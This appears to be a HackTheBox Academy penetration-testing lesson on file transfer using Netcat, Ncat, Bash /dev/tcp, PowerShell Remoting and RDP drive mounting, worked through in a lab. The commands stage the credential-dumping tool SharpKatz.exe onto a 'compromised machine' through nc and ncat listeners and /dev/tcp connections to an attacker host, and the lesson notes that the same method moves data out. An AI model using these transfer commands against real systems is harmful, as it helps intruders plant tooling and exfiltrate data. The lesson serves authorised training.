We've covered various methods for transferring files on Windows and Linux. We also cover ways to achieve the same goal using different programming languages, but there are still many more methods and applications that we can use.

This section will cover alternative methods such as transferring files using [Netcat](https://en.wikipedia.org/wiki/Netcat), [Ncat](https://nmap.org/ncat/) and using RDP and PowerShell sessions.

## Netcat

[Netcat](https://sectools.org/tool/netcat/) (often abbreviated to `nc`) is a computer networking utility for reading from and writing to network connections using TCP or UDP, which means that we can use it for file transfer operations.

The original Netcat was [released](http://seclists.org/bugtraq/1995/Oct/0028.html) by Hobbit in 1995, but it hasn't been maintained despite its popularity. The flexibility and usefulness of this tool prompted the Nmap Project to produce [Ncat](https://nmap.org/ncat/), a modern reimplementation that supports SSL, IPv6, SOCKS and HTTP proxies, connection brokering, and more.

In this section, we will use both the original Netcat and Ncat.

**Note:** **Ncat** is used in HackTheBox's PwnBox as nc, ncat, and netcat.

## File Transfer with Netcat and Ncat

The target or attacking machine can be used to initiate the connection, which is helpful if a firewall prevents access to the target. Let's create an example and transfer a tool to our target.

In this example, we'll transfer [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) from our Pwnbox onto the compromised machine. We'll do it using two methods. Let's work through the first one.

We'll first start Netcat (`nc`) on the compromised machine, listening with option `-l`, selecting the port to listen with the option `-p 8000`, and redirect the [stdout](https://en.wikipedia.org/wiki/Standard_streams#Standard_input_(stdin)) using a single greater-than `>` followed by the filename, `SharpKatz.exe`.

#### NetCat - Compromised Machine - Listening on Port 8000

  ```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

If the compromised machine is using Ncat, we'll need to specify `--recv-only` to close the connection once the file transfer is finished.

#### Ncat - Compromised Machine - Listening on Port 8000

```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attack host, we'll connect to the compromised machine on port 8000 using Netcat and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat. The option `-q 0` will tell Netcat to close the connection once it finishes. That way, we'll know when the file transfer was completed.

#### Netcat - Attack Host - Sending File to Compromised machine

```shell-session
James Pearson@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
James Pearson@htb[/htb]$ # Example using Original Netcat
James Pearson@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

If we use Ncat in our attack host, we can use `--send-only` instead of `-q`. `--send-only` in both connect and listen modes causes Ncat to quit when its input runs out. Usually, it will not stop until the network connection is closed because the remote side may still send something, but in the case of `--send-only`, there's no reason to receive anything more.

#### Ncat - Attack Host - Sending File to Compromised machine

```shell-session
James Pearson@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
James Pearson@htb[/htb]$ # Example using Ncat
James Pearson@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

Instead of listening on our compromised machine, we can connect to a port on our attack host to perform the file transfer operation. This method is useful in scenarios where there's a firewall blocking inbound connections. Let's listen on port 443 on our Pwnbox and send the file [SharpKatz.exe](https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe) as input to Netcat.

#### Attack Host - Sending File as Input to Netcat

```shell-session
James Pearson@htb[/htb]$ # Example using Original Netcat
James Pearson@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Compromised Machine Connect to Netcat to Receive the File

```shell-session
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

Let's do the same with Ncat:

#### Attack Host - Sending File as Input to Ncat

```shell-session
James Pearson@htb[/htb]$ # Example using Ncat
James Pearson@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connect to Ncat to Receive the File

  ```shell-session
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, Bash supports read/write operations on a pseudo-device file [/dev/TCP/](https://tldp.org/LDP/abs/html/devref1.html).

Writing to this particular file makes Bash open a TCP connection to `host:port`, and this feature may be used for file transfers.

#### NetCat - Sending File as Input to Netcat

```shell-session
James Pearson@htb[/htb]$ # Example using Original Netcat
James Pearson@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

#### Ncat - Sending File as Input to Netcat

```shell-session
James Pearson@htb[/htb]$ # Example using Ncat
James Pearson@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

#### Compromised Machine Connecting to Netcat Using /dev/tcp to Receive the File

```shell-session
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**Note:** The same operation can be used to transfer files from the compromised host to our Pwnbox.

## PowerShell Session File Transfer

We already talk about doing file transfers with PowerShell, but there may be scenarios where HTTP, HTTPS, or SMB are unavailable. If that's the case, we can use [PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2), aka WinRM, to perform file transfer operations.

[PowerShell Remoting](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2) allows us to execute scripts or commands on a remote computer using PowerShell sessions. Administrators commonly use PowerShell Remoting to manage remote computers in a network, and we can also use it for file transfer operations. By default, enabling PowerShell remoting creates both an HTTP and an HTTPS listener. The listeners run on default ports TCP/5985 for HTTP and TCP/5986 for HTTPS.

To create a PowerShell Remoting session on a remote computer, we will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting in the session configuration. Let's create an example and transfer a file from `DC01` to `DATABASE01` and vice versa.

We have a session as `Administrator` in `DC01`, the user has administrative rights on `DATABASE01`, and PowerShell Remoting is enabled. Let's use Test-NetConnection to confirm we can connect to WinRM.

#### From DC01 - Confirm WinRM port TCP 5985 is Open on DATABASE01.

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Because this session already has privileges over `DATABASE01`, we don't need to specify credentials. In the example below, a session is created to the remote computer named `DATABASE01` and stores the results in the variable named `$Session`.

#### Create a PowerShell Remoting Session to DATABASE01

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

We can use the `Copy-Item` cmdlet to copy a file from our local machine `DC01` to the `DATABASE01` session we have `$Session` or vice versa.

#### Copy samplefile.txt from our Localhost to the DATABASE01 Session

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

#### Copy DATABASE.txt from DATABASE01 Session to our Localhost

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

RDP (Remote Desktop Protocol) is commonly used in Windows networks for remote access. We can transfer files using RDP by copying and pasting. We can right-click and copy a file from the Windows machine we connect to and paste it into the RDP session.

If we are connected from Linux, we can use `xfreerdp` or `rdesktop`. At the time of writing, `xfreerdp` and `rdesktop` allow copy from our target machine to the RDP session, but there may be scenarios where this may not work as expected.

As an alternative to copy and paste, we can mount a local resource on the target RDP server. `rdesktop` or `xfreerdp` can be used to expose a local folder in the remote RDP session.

#### Mounting a Linux Folder Using rdesktop

```shell-session
James Pearson@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

#### Mounting a Linux Folder Using xfreerdp

```shell-session
James Pearson@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer files to and from the RDP session.

Alternatively, from Windows, the native [mstsc.exe](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) remote desktop client can be used.

![image](https://academy.hackthebox.com/storage/modules/24/rdp.png)

After selecting the drive, we can interact with it in the remote session as follows:

**Note:** This drive is not accessible to any other users logged on to the target computer, even if they manage to hijack the RDP session.

## Practice Makes Perfect

It's worth referencing this section or creating your own notes on these techniques and applying them to labs in other modules in the Penetration Tester Job Role Path and beyond. Some modules/sections where these could come in handy include:

-   `Active Directory Enumeration and Attacks` - Skills Assessments 1 & 2
-   Throughout the `Pivoting, Tunnelling & Port Forwarding` module
-   Throughout the `Attacking Enterprise Networks` module
-   Throughout the `Shells & Payloads` module

You never know what you're up against until you start a lab (or real-world assessment). Once you master one technique in this section or other sections of this module, try another. By the time you finish the Penetration Tester Job Role Path, it would be great to have tried most, if not all, of these techniques. This will help with your "muscle memory" and give you ideas of how to upload/download files when you face a different environment with certain restrictions that make one easier method fail. In the next section, we'll discuss protecting our file transfers when dealing with sensitive data.
